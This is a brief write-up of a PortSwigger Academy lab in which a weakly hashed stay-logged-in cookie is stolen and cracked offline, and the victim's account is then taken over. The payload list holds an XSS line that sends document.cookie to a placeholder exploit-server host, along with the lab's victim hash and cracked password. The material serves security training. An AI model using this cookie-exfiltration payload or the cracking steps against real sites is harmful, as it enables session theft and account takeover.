# Lab: Offline password cracking

**Official lab:** [Lab: Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

## Lab idea

This challenge combines exposure of a password-derived persistent-login value with an offline password-guessing risk. It practices recognizing how a stolen authentication artifact and weak password hashing can compromise an account beyond the original web request.

## Vulnerability in brief
Authentication, often abbreviated **AuthN**, is the process of verifying that a user or client is who they claim to be. It is distinct from authorization (AuthZ), which determines what an authenticated identity is allowed to do. This topic covers vulnerabilities in authentication mechanisms; it is a vulnerability-learning topic, not a general testing category.

## Solution idea
1. With Burp running, use your own account to investigate the "Stay logged in" functionality.
2. In the Proxy > HTTP history tab, go to the Response to your login request and highlight the stay-logged-in cookie, to see that it is constructed as follows: username+':'+md5HashOfPassword
3. You now need to steal the victim user's cookie.
4. Go to the exploit server and make a note of the URL.
- …
6. Decode the cookie in Burp Decoder.
7. Copy the hash and paste it into a search engine.
8. Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.

## Payloads / key values
- `stay-logged-in`
- `username+':'+md5HashOfPassword`
- `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
- `GET`
- `carlos:26323c16d5f4dabff3bb136f2460a943`
- `onceuponatime`

## Official source
- [PortSwigger Academy: Lab: Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)
